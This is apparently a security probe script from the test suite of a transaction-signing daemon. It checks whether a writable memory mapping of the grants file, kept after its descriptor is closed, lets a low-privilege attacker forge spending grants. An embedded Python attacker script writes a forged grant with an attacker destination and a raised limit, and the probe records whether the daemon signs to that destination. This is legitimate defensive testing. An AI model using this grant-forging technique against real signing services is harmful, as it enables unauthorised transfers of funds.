'use strict';
// P10: R4-1/R4-2 — does a retained WRITABLE MMAP (fd closed) slip past
// F_SETLEASE? Two phases:
//
//   Phase A (bypass attempt): attacker mmaps grants.json MAP_SHARED/PROT_WRITE
//     and closes the fd. While the MAPPING lives, the daemon must be refused
//     (lease held_writer) — if instead it starts and signs, R4-1 is bypassed.
//   Phase B (after the attacker drops the mapping): the forged bytes written
//     through the mapping stay in the file. If the daemon then starts and
//     signs the attacker's transaction, the past-write hole (see p2) is
//     reachable through mmap with no fd ever open at daemon start time.
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync, spawn } = require('node:child_process');
const { tmpdir, grantDoc, writeGrants, makeWire, request, Keypair } = require('./common');
const { Daemon } = require('../../src/daemon');
const { loadGrantFile } = require('../../src/grantfile');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

(async () => {
  const dir = tmpdir('signerd-r5-p10-');
  fs.chmodSync(dir, 0o755);
  const out = {};
  const keypair = Keypair.generate();
  const legitDest = Keypair.generate().publicKey;
  const attackerDest = Keypair.generate().publicKey.toBase58();

  const grantsFile = path.join(dir, 'grants.json');
  const original = JSON.stringify(grantDoc(keypair.publicKey.toBase58(), legitDest.toBase58()));
  fs.writeFileSync(grantsFile, original);
  fs.chmodSync(grantsFile, 0o666);

  const forgedPath = path.join(dir, 'forged.json');
  fs.writeFileSync(forgedPath, JSON.stringify(
    grantDoc(keypair.publicKey.toBase58(), attackerDest,
      { maxLamports: '1000000000', windowMaxLamports: '1000000000' })));
  fs.chmodSync(forgedPath, 0o644);

  const sig = path.join(os.tmpdir(), `r5-mmap-${process.pid}`);
  const helper = path.join(__dirname, '..', '..', 'tools', 'leasecheck');

  const attacker = spawn('sudo', ['-n', '-u', 'nobody', 'python3', '-c', `
import mmap, os, time
p = ${JSON.stringify(grantsFile)}
fd = os.open(p, os.O_RDWR)
size = os.fstat(fd).st_size
m = mmap.mmap(fd, size, flags=mmap.MAP_SHARED, prot=mmap.PROT_READ | mmap.PROT_WRITE)
os.close(fd)   # no open write descriptor: only the writable mapping remains
open(${JSON.stringify(sig + '-ready')}, 'w').write('ready')
deadline = time.time() + 60
while not os.path.exists(${JSON.stringify(sig + '-close')}) and time.time() < deadline:
    time.sleep(0.02)
forged = open(${JSON.stringify(forgedPath)}).read()
payload = forged.ljust(size) if len(forged) <= size else forged[:size]
m[:len(payload)] = payload.encode()
m.flush()
open(${JSON.stringify(sig + '-wrote')}, 'w').write('wrote')
deadline = time.time() + 60
while not os.path.exists(${JSON.stringify(sig + '-drop')}) and time.time() < deadline:
    time.sleep(0.02)
m.close()   # attacker releases the mapping on command
open(${JSON.stringify(sig + '-dropped')}, 'w').write('dropped')
`], { stdio: ['ignore', 'pipe', 'pipe'] });
  let attackerErr = '';
  attacker.stderr.on('data', (d) => { attackerErr += d.toString(); });

  if (!fs.existsSync(`${sig}-ready`)) {
    await new Promise((r) => setTimeout(r, 300));
  }
  await new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error(`attacker not ready: ${attackerErr}`)), 20000);
    const iv = setInterval(() => {
      if (fs.existsSync(`${sig}-ready`)) { clearTimeout(t); clearInterval(iv); resolve(); }
    }, 50);
  });

  // ---- PHASE A: mapping alive, fd closed ----
  out.phaseA = {
    open_write_fd: 'closed by attacker (only MAP_SHARED PROT_WRITE mapping lives)',
    mode: (fs.statSync(grantsFile).mode & 0o777).toString(8),
  };
  const lcA = spawnSync(helper, [grantsFile], { encoding: 'utf8' });
  out.phaseA.leasecheck_exit = lcA.status; // 0 = held(pass), 3 = held_writer(refuse)
  out.phaseA.leasecheck_meta = (lcA.stdout || '').split('\n')[0];
  try {
    const d = new Daemon({
      socketPath: path.join(dir, 'p10.sock'),
      keypair,
      grantFile: grantsFile,
      ledgerFile: path.join(dir, 'p10-journal.jsonl'),
    });
    out.phaseA.daemon_construction = 'ACCEPTED (R4-1 BYPASSED)';
    await d.stop();
  } catch (err) {
    out.phaseA.daemon_construction = `REFUSED ${err.code || err.message}`;
  }

  // ---- attacker writes through the mapping, still alive ----
  // operator tightens to 0600 while the attacker still holds the mapping
  fs.chmodSync(grantsFile, 0o600);
  out.phaseA_after_chmod = {
    mode: (fs.statSync(grantsFile).mode & 0o777).toString(8),
  };
  const lcA2 = spawnSync(helper, [grantsFile], { encoding: 'utf8' });
  out.phaseA_after_chmod.leasecheck_exit_after_chmod = lcA2.status;
  try {
    const d2 = new Daemon({
      socketPath: path.join(dir, 'p10.sock'),
      keypair,
      grantFile: grantsFile,
      ledgerFile: path.join(dir, 'p10-journal2.jsonl'),
    });
    out.phaseA_after_chmod.daemon_construction = 'ACCEPTED (R4-1 BYPASSED)';
    await d2.stop();
  } catch (err) {
    out.phaseA_after_chmod.daemon_construction = `REFUSED ${err.code || err.message}`;
  }
  fs.writeFileSync(`${sig}-close`, 'go');
  while (!fs.existsSync(`${sig}-wrote`)) await sleep(50);
  out.file_size_unchanged = fs.statSync(grantsFile).size === original.length;
  out.grant_bytes_changed_while_mapped =
    fs.readFileSync(grantsFile, 'utf8') !== original;

  // ---- PHASE B: attacker drops the mapping; forged bytes remain ----
  fs.writeFileSync(`${sig}-drop`, 'go');
  while (!fs.existsSync(`${sig}-dropped`)) await sleep(50);

  const socketPath = path.join(dir, 'p10b.sock');
  const ledgerFile = path.join(dir, 'p10b-journal.jsonl');
  try {
    const daemon = new Daemon({ socketPath, keypair, grantFile: grantsFile, ledgerFile });
    await daemon.start();
    out.phaseB_daemon_started = true;
    out.phaseB_grant_destination = loadGrantFile(grantsFile).grants.ops.destination;
    out.phaseB_attacker_destination = attackerDest;
    const baseline = await request({ socketPath, grant: 'ops', wire: makeWire(keypair, legitDest, 42) });
    out.phaseB_request_to_orig_dest = { ok: baseline.ok, error: baseline.error };
    const attack = await request({ socketPath, grant: 'ops', wire: makeWire(keypair, attackerDest, 42) });
    out.phaseB_request_to_attacker_dest = attack.ok
      ? { ok: true, signature: attack.signature, seq: attack.seq }
      : { ok: false, error: attack.error };
    await daemon.stop();
  } catch (err) {
    out.phaseB_daemon_started = `REFUSED ${err.code || err.message}`;
  }

  console.log(JSON.stringify(out, null, 2));
  try { attacker.kill('SIGKILL'); } catch { /* gone */ }
  for (const f of [`${sig}-ready`, `${sig}-close`, `${sig}-wrote`, `${sig}-drop`, `${sig}-dropped`]) {
    try { fs.unlinkSync(f); } catch { /* gone */ }
  }
  fs.rmSync(dir, { recursive: true, force: true });
  process.exit(0);
})().catch((err) => { console.error('PROBE ERROR', err); process.exit(1); });
